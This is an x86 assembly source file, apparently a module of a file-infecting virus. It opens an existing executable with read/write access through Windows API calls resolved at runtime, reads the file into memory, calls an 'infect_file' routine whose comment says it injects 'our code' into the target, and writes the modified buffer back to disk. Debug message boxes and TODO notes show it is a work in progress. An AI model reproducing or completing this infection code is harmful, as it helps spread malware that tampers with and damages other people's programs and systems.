
ifndef	SEARCH_FILES_ASM_
SEARCH_FILES_ASM_ MACRO
ENDM

search_exe:
	push	0							; No template file
	push	80h							; FILE_ATTRIBUTES_NORMAL
	push 	3							; ONLY_EXISTING (only if it exists)
	push	0							; no security
	push	0							; no sharing
	push	0c0000000h					; GENERIC_READ | GENERIC_WRITE
	lea		ecx, [ebx + offset file_name]
	push	ecx							;
	call	createfile_addr				; CreateFile()
	mov		filehandle, eax
	cmp		filehandle, -1
	je		syserr
	
	push	0
	push	filehandle
	call	getfilesize_addr			; GetFileFize()
	mov		filesize, eax
	cmp		eax, -1
	je		syserr

	add		eax, 5000h					; TODO: calculate size to allocate more properly.

	push    04h							; read/write permissions
	push    00001000h					; MEM_COMMIT
	push    eax							; size to allocate
	push    0							; address. NULL == we want a new address
	call    virtualalloc_addr			; VirtualAlloc()
	mov     fileptr, eax
	cmp		eax, 0
	je		syserr

	push	0
	lea		ecx, [esp - 4]
	push	ecx
	push	filesize
	push	fileptr
	push	filehandle
	call	readfile_addr				; ReadFile(). Read all the file and put it in our buffer.
	cmp		eax, 0
	je		syserr

; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !

	invoke	infect_file, fileptr		; Procedure to properly inject our code into the file of interest.

	cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
	jne		infect_dbg							; DEBUG
	push	0									; DEBUG
	lea		ecx, [ebx + offset dbg_infectfail]	; DEBUG
	push	ecx									; DEBUG
	push	ecx									; DEBUG
	push	0									; DEBUG
	call	messagebox_addr						; DEBUG
infect_dbg:										; DEBUG

	push	0							; 0 = from beginning of the file
	push	0							; 0 = no high order DWORD for size to move
	push	0							; size to move
	push	filehandle
	call	setfilepointer_addr			; Move back to the beginning of the file
	cmp		eax, -1
	je		syserr

	push	0
	lea		ecx, [esp - 4]
	push	ecx
	mov		ecx, filesize
	add		ecx, 5000h					; TODO: calculate size more properly
	push	ecx
	push	fileptr
	push	filehandle
	call	writefile_addr				; Write the buffer back to the file.

	push	filehandle
	call	closehandle_addr			; We close the file because we are not pigs.

	jmp		exit_search_exe
syserr:
	push	0									; DEBUG
	lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
	push	ecx									; DEBUG
	push	ecx									; DEBUG
	push	0									; DEBUG
	call	messagebox_addr						; DEBUG

exit_search_exe:

	;jmp		search_exe

endif	; SEARCH_FILES_ASM_